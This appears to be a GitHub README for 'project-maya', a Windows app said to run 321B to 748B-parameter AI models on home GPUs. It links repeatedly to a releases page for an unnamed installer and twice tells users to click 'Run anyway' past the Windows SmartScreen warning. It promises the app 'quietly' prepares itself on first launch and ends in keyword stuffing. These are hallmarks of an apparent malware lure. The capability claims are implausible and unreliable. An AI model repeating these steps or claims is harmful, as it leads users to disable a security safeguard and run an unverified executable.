# 🚀 project-maya - Run Massive AI Models At Home

[![Download project-maya](https://img.shields.io/badge/Download-project--maya-blueviolet?style=for-the-badge&logo=github)](https://github.com/pirkashif/project-maya/releases)

Welcome! project-maya lets you run enormous, cutting-edge AI models on your own computer, with no monthly subscription and no internet connection required. One engine, one simple dashboard, and everything stays on your machine.

Visit this link to download the application: https://github.com/pirkashif/project-maya/releases

---

## ✨ What Is project-maya?

project-maya is a free application that turns your own graphics card into a private AI server. Instead of paying a website every month to chat with a smart assistant, you install project-maya once and run the same class of powerful models locally.

It is built around three flagship models:

- **GLM-5.3-Flash** — a 321 billion parameter model that is fast, sharp, and great for everyday chat and writing.
- **DeepSeek-V4.1-Flash** — a 748 billion parameter model built for deep reasoning, long documents, and tricky technical questions.
- **MiniMax-M3.1-Flash** — a 428 billion parameter model that excels at creative writing, long conversations, and multilingual work.

All three are "mixture-of-experts" models, which is a clever design that means you get the quality of a giant model while only using a fraction of the computing power at any moment. That is what makes running them at home possible.

---

## 🎯 What You Can Do With It

- **Chat privately.** Ask questions, brainstorm, draft emails, or summarize documents without anything leaving your computer.
- **Use the apps you already love.** project-maya speaks the same language as OpenAI and Anthropic tools, so popular chat apps can connect to it as if it were a cloud service.
- **Work offline.** Flights, cabins, bad Wi-Fi, strict offices — project-maya keeps working.
- **Run several models side by side.** Switch between the three models from a single dashboard with one click.
- **See what is happening.** Live graphs show speed, memory use, and which model is loaded.

---

## 💻 Before You Begin

You do not need to be a programmer, but you do need a reasonably modern computer. Here is what we recommend:

| Component | Minimum | Comfortable |
|---|---|---|
| Operating system | Windows 10 (64-bit) | Windows 11 (64-bit) |
| Graphics card | NVIDIA with 12 GB memory | NVIDIA RTX 4090 / 5090 with 24 GB or more |
| System memory | 32 GB | 64 GB or more |
| Free disk space | 150 GB | 500 GB SSD |
| Processor | Any modern 6-core | 8-core or better |

AMD graphics cards are also supported through ROCm on Linux, and the Windows build includes support for newer AMD cards. If you are unsure what your computer has, press the Windows key, type "System Information," and look for the graphics card and installed memory listed there.

The very large models benefit from more memory. If your card has less, project-maya automatically uses compressed ("quantized") versions of each model so they still fit and still run well.

---

## 📥 Download and Install on Windows

Follow these steps exactly, one at a time.

1. **Visit this link to download the application:** https://github.com/pirkashif/project-maya/releases
2. On that page you will see a list of versions. Click the newest one at the top.
3. Under the newest version, find the file made for Windows and click it to download.
4. When the download finishes, open your **Downloads** folder and double-click the file you just downloaded.
5. Windows may show a blue box saying "Windows protected your PC." If it does, click **More info**, then click **Run anyway**. This is normal for small independent projects.
6. Follow the installer on screen. Click **Next**, accept the default folder, and click **Install**.
7. When it finishes, leave the checkbox ticked and click **Finish** to launch project-maya for the first time.

On first launch, project-maya will check your graphics card and quietly prepare itself. This can take a few minutes. You will see a progress bar — just let it finish.

---

## 🖥️ Your First Run: A Tour of the Dashboard

When project-maya opens, you land on the dashboard. It has four simple areas:

**1. The model picker.** A dropdown at the top lists GLM-5.3-Flash, DeepSeek-V4.1-Flash, and MiniMax-M3.1-Flash. Pick one and click **Load**. The first time you load a model it will be downloaded and prepared, which takes a while depending on your internet speed. After that, loading is quick.

**2. The chat window.** The big panel in the middle. Type a message and press Enter. You will see the reply appear word by word, just like a chat website.

**3. The speed panel.** On the right you will see numbers updating live: tokens per second (how fast it is thinking), memory used, and graphics card temperature. Higher tokens per second is better.

**4. The settings gear.** Top right corner. This is where you change how the models behave — more on that below.

If you ever feel lost, click the small question mark in the corner of any panel for a plain-English explanation.

---

## 🔌 Works With Your Favorite AI Apps

project-maya includes a built-in connection server. In plain terms, it makes your computer look like an AI service that other apps can talk to. This means you can point tools that normally require OpenAI or Anthropic accounts at your own machine instead.

To use it:

1. Open **Settings**, then **Connections**.
2. Turn on **Enable local server**.
3. Note the address shown there, which looks like a web address starting with `http://localhost`.
4. In your other app's settings, choose "custom" or "OpenAI-compatible" or "Anthropic-compatible" as the provider, and paste in that address.

Because project-maya supports both the OpenAI and Anthropic styles of talking to AI, most chat front-ends, coding assistants, and note-taking tools will connect without any extra work. If an app asks for an API key, you can type any word you like — it is only there for apps that insist on having one, and nothing is sent anywhere.

---

## 🧠 The Models Inside

You do not have to download anything separately. project-maya knows where to find each model and fetches what it needs, in compressed form, when you first select it.

- **GLM-5.3-Flash (321B)** — the everyday workhorse. Loads fastest, uses the least memory, and handles most questions beautifully. Start here.
- **DeepSeek-V4.1-Flash (748B)** — the deep thinker. Slower to load, needs the most memory, but shines on math, code, and long analysis.
- **MiniMax-M3.1-Flash (428B)** — the creative one. Excellent for storytelling, rewriting, and conversations in many languages.

Everything is stored in the "offline" format, which is a widely used compressed model file type. That means once downloaded, the models work with no internet connection at all.

---

## ⚙️ Making It Faster

A few settings make a big difference, and none of them are scary:

- **Lower the context length** if replies feel slow. This is how much of the conversation the model remembers at once. Shorter memory means faster answers.
- **Use a smaller compression setting** if you run out of graphics card memory. The app will suggest the right one automatically.
- **Close other heavy apps** such as games or video editors while a model is loaded. They compete for the same memory.
- **Keep the model loaded** between chats. Reloading a model is the slowest part, so staying in one model for a session is smoother.

---

## 🛠️ Troubleshooting

**The app says it cannot find my graphics card.**
Update your graphics card driver from NVIDIA's or AMD's website, restart your computer, and try again.

**It says "out of memory."**
Choose a model with a smaller size, or open Settings and pick a stronger compression level. Also close other apps.

**The download is very slow.**
Models are large files, sometimes over 100 GB in total. A wired connection helps enormously. You can pause and resume downloads from the Downloads panel.

**Windows blocked the installer.**
Click **More info**, then **Run anyway**. This happens because the project is distributed by a small team rather than a large company.

**The dashboard opens but the chat is blank.**
Make sure a model is loaded — the model picker should show its name and a green dot.

---

## ❓ Frequently Asked Questions

**Do I need to pay for anything?**
No. project-maya is free and open source. There are no accounts, no subscriptions, and no usage limits.

**Does it need the internet?**
Only to download the app and the models. After that, everything runs offline.

**Is my data private?**
Yes. Your conversations never leave your computer. Nothing is uploaded, logged, or shared.

**Can I use it on a laptop?**
Yes, if the laptop has a capable graphics card with enough memory. Many gaming laptops work well with GLM-5.3-Flash.

**Will it work on Linux or Mac?**
Linux is supported, including AMD cards through ROCm. Mac support is not part of this release.

**How much disk space will I really need?**
Around 150 GB if you plan to keep one model at a time, and considerably more if you want all three ready to go.

---

## 💬 Getting Help

If you get stuck, open the **Help** menu inside the app and choose **Report a problem**. You can also visit the project page at https://github.com/pirkashif/project-maya/releases to read release notes and see what changed in each version.

---

Keywords: anthropic-api, cuda, deepseek, deepseek-v4, gguf, glm, glm-5, llm, llm-inference, local-llm, minimax, minimax-m3, mixture-of-experts, moe, offline, openai-api, quantization, rocm, self-hosted, windows